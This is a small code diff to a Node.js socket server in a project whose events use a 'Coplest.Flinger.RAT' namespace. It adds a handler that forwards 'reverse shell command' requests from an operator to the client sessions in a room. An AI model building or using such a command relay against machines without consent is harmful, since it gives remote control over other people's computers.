@@ -124,6 +124,9 @@ function Socket(dependencies) {
                                 case 'UserScreenshot#Request':
                                     ratServiceNamespace.to(data.Values.RoomId).emit('Coplest.Flinger.RAT', { Command: 'RefreshScreenshot#Request', Values: data.Values })
                                     break;
+                                case 'SendReverseShellCommand#Request':
+                                    ratServiceNamespace.to(data.Values.RoomId).emit('Coplest.Flinger.RAT', { Command: 'ReverseShellCommand#Request', Values: data.Values })
+                                    break;
                                 default:
                                     break;
                             }
@@ -290,7 +293,6 @@ function Socket(dependencies) {
 
                 adminPoolNamespace.emit('Coplest.Flinger.RAT', { Command: 'UnsubscribeSocketToApiKey#Request', Values: { SocketId: socket.id, ApiKey: socket.ApiKey } });
             });
-
 
             socket.on('Coplest.Flinger.AddApiKeyToSocket', function (data) {
                 if (data.ApiKey != undefined) {
